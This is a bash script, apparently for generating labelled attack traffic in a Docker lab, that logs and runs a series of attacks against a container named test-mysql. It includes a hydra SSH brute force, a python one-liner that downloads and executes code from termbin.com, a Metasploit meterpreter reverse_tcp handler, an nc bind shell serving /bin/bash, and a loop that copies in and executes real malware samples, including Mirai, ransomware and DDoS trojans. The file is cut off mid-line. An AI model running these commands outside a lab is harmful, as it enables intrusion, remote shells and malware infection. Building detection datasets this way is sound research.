#!/bin/bash

log_file=~/malicious-$1-record.$( date "+%m-%d-%H:%M:%S" ).txt

logger ()
{
IFS=: read -r h m s ms <<<"$( date +%H:%M:%S:%9N)"
ms=$( echo "scale=9; $ms/1000000000"  | bc -l )
timestamp=$(((10#$h * 60 + 10#$m) * 60 + 10#$s))
timestamp=$(echo "$timestamp + $ms" | bc )
echo "Running $1 attack at $timestamp" >> $log_file
echo "Running $1 attack at $timestamp" 
}

hydra_runner ()
{
logger "hydra_brute_force_login"
hydra -l pinchen -P ~/test-mysql/SQLBehavior/password.list 172.17.0.2 ssh &
sleep 3
pkill hydra
}

python_runner ()
{
logger "python_in_memory_malware"
sudo docker exec -i test-mysql python -c "import urllib2;exec(urllib2.urlopen('http://termbin.com/imb94').read())" 
####
# NOTES:
# This binary may expire. Check its availability before use.
####
sudo docker exec -i test-mysql pkill -9 python
}

meterpreter_runner ()
{
logger "meterpreter"
tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/rs & 
echo "start"
####
# NOTES:
# "tail -f /dev/null |" 
# meterpreter will try to read from STDIN, thus it must be bypassed while automation the procedure
####
sleep 0.5
tail -f /dev/null | msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost 172.17.0.1; set lport 2020; run;"  &> /dev/null &
#while [ "$(pgrep msf)" = "" ]; do
#sleep 0.5
#done
pid=$(pgrep msf)
#wait
echo "done"
####
# NOTES:
# echo -e "ps -A" > /proc/$pid/fd/0
# additional could be issued to the fd, however, meterpreter sends payload and there is no need to send additional artifacts.
####
sleep 4
sudo pkill -9 msfconsole
sudo pkill -9 ruby
sudo docker exec -i test-mysql pkill -9 rs
}

nc_remote_shell ()
{
logger "remote_shell"
sudo docker exec -i test-mysql service ssh start
tail -f /dev/null | sudo docker exec -i test-mysql nc -nlvp 2020 -e /bin/bash &> /dev/null &
####
# NOTES:
# same as meterpreter
####
sleep 0.5
nc -d 172.17.0.2 2020 &
pid=$(pgrep -x nc)
pid=$(echo -n $pid | tail -c 5)
sudo kill -9 $pid
}

malware_runner ()
{
malware_flag=$(( ( $RANDOM % 40 )  + 1  ))
if [[ $malware_flag -eq 0 ]]; then
	logger 'Linux Malware - Backdoor.Linux.Bodoor-b448121b9caa65c119dacbaa3dc06649'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Backdoor.Linux.Bodoor-b448121b9caa65c119dacbaa3dc06649 /tmp/Virus/Backdoor.Linux.Bodoor-b448121b9caa65c119dacbaa3dc06649
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Backdoor.Linux.Bodoor-b448121b9caa65c119dacbaa3dc06649 &> /dev/null &
	sleep 1.2186
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 1 ]]; then
	logger 'Linux Malware - Backdoor.Linux.Dofloo.b-08e3dbc7c863b1a28701370a762a59b7'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Backdoor.Linux.Dofloo.b-08e3dbc7c863b1a28701370a762a59b7 /tmp/Virus/Backdoor.Linux.Dofloo.b-08e3dbc7c863b1a28701370a762a59b7
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Backdoor.Linux.Dofloo.b-08e3dbc7c863b1a28701370a762a59b7 &> /dev/null &
	sleep 1.9047
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 2 ]]; then
	logger 'Linux Malware - Backdoor.Linux.Katien.d-1d1a7c789bd31b95622e8a907e3d675e'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Backdoor.Linux.Katien.d-1d1a7c789bd31b95622e8a907e3d675e /tmp/Virus/Backdoor.Linux.Katien.d-1d1a7c789bd31b95622e8a907e3d675e
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Backdoor.Linux.Katien.d-1d1a7c789bd31b95622e8a907e3d675e &> /dev/null &
	sleep 1.2432
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 3 ]]; then
	logger 'Linux Malware - Backdoor.Linux.Roopre.d-89b499443277150802e7f323930c8601'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Backdoor.Linux.Roopre.d-89b499443277150802e7f323930c8601 /tmp/Virus/Backdoor.Linux.Roopre.d-89b499443277150802e7f323930c8601
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Backdoor.Linux.Roopre.d-89b499443277150802e7f323930c8601 &> /dev/null &
	sleep 1.3089
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 4 ]]; then
	logger 'Linux Malware - Backdoor.Linux.SpyEye.q-a168b7097dda3d7f600afbfcc19d4c4b'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Backdoor.Linux.SpyEye.q-a168b7097dda3d7f600afbfcc19d4c4b /tmp/Virus/Backdoor.Linux.SpyEye.q-a168b7097dda3d7f600afbfcc19d4c4b
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Backdoor.Linux.SpyEye.q-a168b7097dda3d7f600afbfcc19d4c4b &> /dev/null &
	sleep 1.5617
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 5 ]]; then
	logger 'Linux Malware - Backdoor.Linux.Gafgyt.ak-a282f3285e8c00df98e02c5a6ef63cfe'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Backdoor.Linux.Gafgyt.ak-a282f3285e8c00df98e02c5a6ef63cfe /tmp/Virus/Backdoor.Linux.Gafgyt.ak-a282f3285e8c00df98e02c5a6ef63cfe
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Backdoor.Linux.Gafgyt.ak-a282f3285e8c00df98e02c5a6ef63cfe &> /dev/null &
	sleep 1.8902
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 6 ]]; then
	logger 'Linux Malware - Backdoor.Linux.PKC.a-18d978da1f3dd0c66dceffa29403d812'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Backdoor.Linux.PKC.a-18d978da1f3dd0c66dceffa29403d812 /tmp/Virus/Backdoor.Linux.PKC.a-18d978da1f3dd0c66dceffa29403d812
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Backdoor.Linux.PKC.a-18d978da1f3dd0c66dceffa29403d812 &> /dev/null &
	sleep 1.221
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 7 ]]; then
	logger 'Linux Malware - Backdoor.Linux.Wirenet.a-9a0e765eecc5433af3dc726206ecc56e'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Backdoor.Linux.Wirenet.a-9a0e765eecc5433af3dc726206ecc56e /tmp/Virus/Backdoor.Linux.Wirenet.a-9a0e765eecc5433af3dc726206ecc56e
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Backdoor.Linux.Wirenet.a-9a0e765eecc5433af3dc726206ecc56e &> /dev/null &
	sleep 1.5488
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 8 ]]; then
	logger 'Linux Malware - Backdoor.Linux.Tsunami.gen-7569ea823263531ee59528990d154fe6'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Backdoor.Linux.Tsunami.gen-7569ea823263531ee59528990d154fe6 /tmp/Virus/Backdoor.Linux.Tsunami.gen-7569ea823263531ee59528990d154fe6
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Backdoor.Linux.Tsunami.gen-7569ea823263531ee59528990d154fe6 &> /dev/null &
	sleep 1.7792
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 9 ]]; then
	logger 'Linux Malware - Flooder.Linux.Small.r-c149edb0d281bfd57a6dc53380eb022f'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Flooder.Linux.Small.r-c149edb0d281bfd57a6dc53380eb022f /tmp/Virus/Flooder.Linux.Small.r-c149edb0d281bfd57a6dc53380eb022f
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Flooder.Linux.Small.r-c149edb0d281bfd57a6dc53380eb022f &> /dev/null &
	sleep 1.575
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 10 ]]; then
	logger 'Linux Malware - HEUR:Backdoor.Linux.Ganiw.d-7558b89eb6b61d691470b3f6b7eff249'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Backdoor.Linux.Ganiw.d-7558b89eb6b61d691470b3f6b7eff249 /tmp/Virus/HEUR:Backdoor.Linux.Ganiw.d-7558b89eb6b61d691470b3f6b7eff249
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Backdoor.Linux.Ganiw.d-7558b89eb6b61d691470b3f6b7eff249 &> /dev/null &
	sleep 1.4989
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 11 ]]; then
	logger 'Linux Malware - HEUR:Backdoor.Linux.IrcShell.p-3f1d61809dbc78001c13d359584bdac9'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Backdoor.Linux.IrcShell.p-3f1d61809dbc78001c13d359584bdac9 /tmp/Virus/HEUR:Backdoor.Linux.IrcShell.p-3f1d61809dbc78001c13d359584bdac9
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Backdoor.Linux.IrcShell.p-3f1d61809dbc78001c13d359584bdac9 &> /dev/null &
	sleep 1.5928
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 12 ]]; then
	logger 'Linux Malware - HEUR:Backdoor.Linux.Ropys.a-3e3de18adb102efcdff92a6ed5522be7'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Backdoor.Linux.Ropys.a-3e3de18adb102efcdff92a6ed5522be7 /tmp/Virus/HEUR:Backdoor.Linux.Ropys.a-3e3de18adb102efcdff92a6ed5522be7
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Backdoor.Linux.Ropys.a-3e3de18adb102efcdff92a6ed5522be7 &> /dev/null &
	sleep 1.4892
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 13 ]]; then
	logger 'Linux Malware - HEUR:Backdoor.Linux.Sshgo.a-fe82c7fbcac1b1868a3c8401ea906bf1'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Backdoor.Linux.Sshgo.a-fe82c7fbcac1b1868a3c8401ea906bf1 /tmp/Virus/HEUR:Backdoor.Linux.Sshgo.a-fe82c7fbcac1b1868a3c8401ea906bf1
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Backdoor.Linux.Sshgo.a-fe82c7fbcac1b1868a3c8401ea906bf1 &> /dev/null &
	sleep 1.5198
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 14 ]]; then
	logger 'Linux Malware - HEUR:Backdoor.Linux.Tori.a-cd41c0e3d6aa075cbacadee78a42986c'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Backdoor.Linux.Tori.a-cd41c0e3d6aa075cbacadee78a42986c /tmp/Virus/HEUR:Backdoor.Linux.Tori.a-cd41c0e3d6aa075cbacadee78a42986c
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Backdoor.Linux.Tori.a-cd41c0e3d6aa075cbacadee78a42986c &> /dev/null &
	sleep 1.4497
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 15 ]]; then
	logger 'Linux Malware - HEUR:Backdoor.Linux.Vpnfilter.a-4912aad5e79c78bc143e71633df9c17b'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Backdoor.Linux.Vpnfilter.a-4912aad5e79c78bc143e71633df9c17b /tmp/Virus/HEUR:Backdoor.Linux.Vpnfilter.a-4912aad5e79c78bc143e71633df9c17b
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Backdoor.Linux.Vpnfilter.a-4912aad5e79c78bc143e71633df9c17b &> /dev/null &
	sleep 1.9544
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 16 ]]; then
	logger 'Linux Malware - HEUR:Backdoor.Multi.Mibsun.gen-84e3ad0d62d21739d632d2106864e79e'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Backdoor.Multi.Mibsun.gen-84e3ad0d62d21739d632d2106864e79e /tmp/Virus/HEUR:Backdoor.Multi.Mibsun.gen-84e3ad0d62d21739d632d2106864e79e
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Backdoor.Multi.Mibsun.gen-84e3ad0d62d21739d632d2106864e79e &> /dev/null &
	sleep 1.7504
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 17 ]]; then
	logger 'Linux Malware - HEUR:DoS.Linux.Agent.bl-96f43bc0302b836a355130e599f88d7d'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:DoS.Linux.Agent.bl-96f43bc0302b836a355130e599f88d7d /tmp/Virus/HEUR:DoS.Linux.Agent.bl-96f43bc0302b836a355130e599f88d7d
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:DoS.Linux.Agent.bl-96f43bc0302b836a355130e599f88d7d &> /dev/null &
	sleep 1.5171
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 18 ]]; then
	logger 'Linux Malware - HEUR:Exploit.Linux.CVE-2016-5195.a-42ce5d5179304407b2c0197b78e5b7b0'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Exploit.Linux.CVE-2016-5195.a-42ce5d5179304407b2c0197b78e5b7b0 /tmp/Virus/HEUR:Exploit.Linux.CVE-2016-5195.a-42ce5d5179304407b2c0197b78e5b7b0
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Exploit.Linux.CVE-2016-5195.a-42ce5d5179304407b2c0197b78e5b7b0 &> /dev/null &
	sleep 1.1905
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 19 ]]; then
	logger 'Linux Malware - HEUR:Exploit.Linux.Intfour.a-ff1e9d1fc459dd83333fd94dbe36229a'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Exploit.Linux.Intfour.a-ff1e9d1fc459dd83333fd94dbe36229a /tmp/Virus/HEUR:Exploit.Linux.Intfour.a-ff1e9d1fc459dd83333fd94dbe36229a
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Exploit.Linux.Intfour.a-ff1e9d1fc459dd83333fd94dbe36229a &> /dev/null &
	sleep 1.7945
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 20 ]]; then
	logger 'Linux Malware - HEUR:Exploit.Linux.Lotoor.bh-2ba254e843d46b542bf4a5626b833c5b'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Exploit.Linux.Lotoor.bh-2ba254e843d46b542bf4a5626b833c5b /tmp/Virus/HEUR:Exploit.Linux.Lotoor.bh-2ba254e843d46b542bf4a5626b833c5b
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Exploit.Linux.Lotoor.bh-2ba254e843d46b542bf4a5626b833c5b &> /dev/null &
	sleep 1.1707
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 21 ]]; then
	logger 'Linux Malware - HEUR:Exploit.Linux.Race.a-4a1e830050766ca432536408eca8c58c'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Exploit.Linux.Race.a-4a1e830050766ca432536408eca8c58c /tmp/Virus/HEUR:Exploit.Linux.Race.a-4a1e830050766ca432536408eca8c58c
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Exploit.Linux.Race.a-4a1e830050766ca432536408eca8c58c &> /dev/null &
	sleep 1.6429
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 22 ]]; then
	logger 'Linux Malware - HEUR:HackTool.Linux.PNScan.a-e09f9afc6a7da198cb31ab71b0f8e174'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:HackTool.Linux.PNScan.a-e09f9afc6a7da198cb31ab71b0f8e174 /tmp/Virus/HEUR:HackTool.Linux.PNScan.a-e09f9afc6a7da198cb31ab71b0f8e174
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:HackTool.Linux.PNScan.a-e09f9afc6a7da198cb31ab71b0f8e174 &> /dev/null &
	sleep 1.5708
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 23 ]]; then
	logger 'Linux Malware - HEUR:HackTool.Linux.Portscan.b-a7bdcad5b9c29c9a4af5d45b79bf517a'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:HackTool.Linux.Portscan.b-a7bdcad5b9c29c9a4af5d45b79bf517a /tmp/Virus/HEUR:HackTool.Linux.Portscan.b-a7bdcad5b9c29c9a4af5d45b79bf517a
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:HackTool.Linux.Portscan.b-a7bdcad5b9c29c9a4af5d45b79bf517a &> /dev/null &
	sleep 1.4381
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 24 ]]; then
	logger 'Linux Malware - HEUR:Trojan-Banker.AndroidOS.Wroba.a-efea955550b8c192a3ecf8d320613aaf'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Trojan-Banker.AndroidOS.Wroba.a-efea955550b8c192a3ecf8d320613aaf /tmp/Virus/HEUR:Trojan-Banker.AndroidOS.Wroba.a-efea955550b8c192a3ecf8d320613aaf
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Trojan-Banker.AndroidOS.Wroba.a-efea955550b8c192a3ecf8d320613aaf &> /dev/null &
	sleep 1.8844
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 25 ]]; then
	logger 'Linux Malware - HEUR:Trojan-DDoS.Linux.Ddostf.a-aa16fd4728467155f02b3d5b33338f67'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Trojan-DDoS.Linux.Ddostf.a-aa16fd4728467155f02b3d5b33338f67 /tmp/Virus/HEUR:Trojan-DDoS.Linux.Ddostf.a-aa16fd4728467155f02b3d5b33338f67
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Trojan-DDoS.Linux.Ddostf.a-aa16fd4728467155f02b3d5b33338f67 &> /dev/null &
	sleep 1.8193
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 26 ]]; then
	logger 'Linux Malware - HEUR:Trojan-DDoS.Linux.Sotdas.a-7c2044998e56d6edef5562dab3b07ee5'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Trojan-DDoS.Linux.Sotdas.a-7c2044998e56d6edef5562dab3b07ee5 /tmp/Virus/HEUR:Trojan-DDoS.Linux.Sotdas.a-7c2044998e56d6edef5562dab3b07ee5
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Trojan-DDoS.Linux.Sotdas.a-7c2044998e56d6edef5562dab3b07ee5 &> /dev/null &
	sleep 1.2908
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 27 ]]; then
	logger 'Linux Malware - HEUR:Trojan-DDoS.Linux.Znaich.a-dce96b0c1968a2f58da7a28bff295f77'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Trojan-DDoS.Linux.Znaich.a-dce96b0c1968a2f58da7a28bff295f77 /tmp/Virus/HEUR:Trojan-DDoS.Linux.Znaich.a-dce96b0c1968a2f58da7a28bff295f77
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Trojan-DDoS.Linux.Znaich.a-dce96b0c1968a2f58da7a28bff295f77 &> /dev/null &
	sleep 1.5616
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 28 ]]; then
	logger 'Linux Malware - HEUR:Worm.Linux.Pilkah.gen-ac2c9ce2b3edf07045024d60f9b4e53e'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HEUR:Worm.Linux.Pilkah.gen-ac2c9ce2b3edf07045024d60f9b4e53e /tmp/Virus/HEUR:Worm.Linux.Pilkah.gen-ac2c9ce2b3edf07045024d60f9b4e53e
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HEUR:Worm.Linux.Pilkah.gen-ac2c9ce2b3edf07045024d60f9b4e53e &> /dev/null &
	sleep 1.1728
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 29 ]]; then
	logger 'Linux Malware - HackTool.Linux.ProcHider.b-d5290df2b8797b360651ae2a9efbd829'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HackTool.Linux.ProcHider.b-d5290df2b8797b360651ae2a9efbd829 /tmp/Virus/HackTool.Linux.ProcHider.b-d5290df2b8797b360651ae2a9efbd829
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HackTool.Linux.ProcHider.b-d5290df2b8797b360651ae2a9efbd829 &> /dev/null &
	sleep 1.2269
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 30 ]]; then
	logger 'Linux Malware - HackTool.Linux.Sshbru.i-792b3b390c9597bafda3f2c27b18cacb'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/HackTool.Linux.Sshbru.i-792b3b390c9597bafda3f2c27b18cacb /tmp/Virus/HackTool.Linux.Sshbru.i-792b3b390c9597bafda3f2c27b18cacb
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/HackTool.Linux.Sshbru.i-792b3b390c9597bafda3f2c27b18cacb &> /dev/null &
	sleep 1.0646
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 31 ]]; then
	logger 'Linux Malware - Linux.Trojan.Setag.SwujfromTencentdetection...-c819b1705f2938ac258397c29618fceb'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Linux.Trojan.Setag.SwujfromTencentdetection...-c819b1705f2938ac258397c29618fceb /tmp/Virus/Linux.Trojan.Setag.SwujfromTencentdetection...-c819b1705f2938ac258397c29618fceb
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Linux.Trojan.Setag.SwujfromTencentdetection...-c819b1705f2938ac258397c29618fceb &> /dev/null &
	sleep 1.6514
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 32 ]]; then
	logger 'Linux Malware - Trojan-DDoS.Linux.DnsAmp.a-a4eecf76f4c90fb8065800d4cad391df'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Trojan-DDoS.Linux.DnsAmp.a-a4eecf76f4c90fb8065800d4cad391df /tmp/Virus/Trojan-DDoS.Linux.DnsAmp.a-a4eecf76f4c90fb8065800d4cad391df
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Trojan-DDoS.Linux.DnsAmp.a-a4eecf76f4c90fb8065800d4cad391df &> /dev/null &
	sleep 1.2626
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 33 ]]; then
	logger 'Linux Malware - Trojan-DDoS.Linux.Xarcen.a-9e3f2816aedb9f6fcf1b614c0a9aa0f3'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Trojan-DDoS.Linux.Xarcen.a-9e3f2816aedb9f6fcf1b614c0a9aa0f3 /tmp/Virus/Trojan-DDoS.Linux.Xarcen.a-9e3f2816aedb9f6fcf1b614c0a9aa0f3
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Trojan-DDoS.Linux.Xarcen.a-9e3f2816aedb9f6fcf1b614c0a9aa0f3 &> /dev/null &
	sleep 1.5185
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 34 ]]; then
	logger 'Linux Malware - Trojan-Downloader.Linux.Mirai.d-261c6cbdfb899acc8111d49487976de2'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Trojan-Downloader.Linux.Mirai.d-261c6cbdfb899acc8111d49487976de2 /tmp/Virus/Trojan-Downloader.Linux.Mirai.d-261c6cbdfb899acc8111d49487976de2
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Trojan-Downloader.Linux.Mirai.d-261c6cbdfb899acc8111d49487976de2 &> /dev/null &
	sleep 1.0859
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 35 ]]; then
	logger 'Linux Malware - Trojan-Downloader.Linux.ShellLoader.a-8d59c7b144e8733cabdd453582045582'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Trojan-Downloader.Linux.ShellLoader.a-8d59c7b144e8733cabdd453582045582 /tmp/Virus/Trojan-Downloader.Linux.ShellLoader.a-8d59c7b144e8733cabdd453582045582
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Trojan-Downloader.Linux.ShellLoader.a-8d59c7b144e8733cabdd453582045582 &> /dev/null &
	sleep 1.7925
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 36 ]]; then
	logger 'Linux Malware - Trojan-Ransom.Linux.Cryptor.b-1e19b857a5f5a9680555fa9623a88e99'
	sudo docker exec -i test-mysql sshpass -p pinchen scp vm-0@172.17.0.1:~/Documents/Virus/Trojan-Ransom.Linux.Cryptor.b-1e19b857a5f5a9680555fa9623a88e99 /tmp/Virus/Trojan-Ransom.Linux.Cryptor.b-1e19b857a5f5a9680555fa9623a88e99
	tail -f /dev/null | sudo docker exec -i test-mysql ./tmp/Virus/Trojan-Ransom.Linux.Cryptor.b-1e19b857a5f5a9680555fa9623a88e99 &> /dev/null &
	sleep 1.6428
	echo '**************Execution Complete & Start Cleaning!***********'
	sudo docker exec -i test-mysql kill -9 -1 &
fi
if [[ $malware_flag -eq 37 ]]; then
	logger 'Linux Malware - Trojan-Spy.Linux.Pymadro.a-fcbfb234b912c84e052a4a'
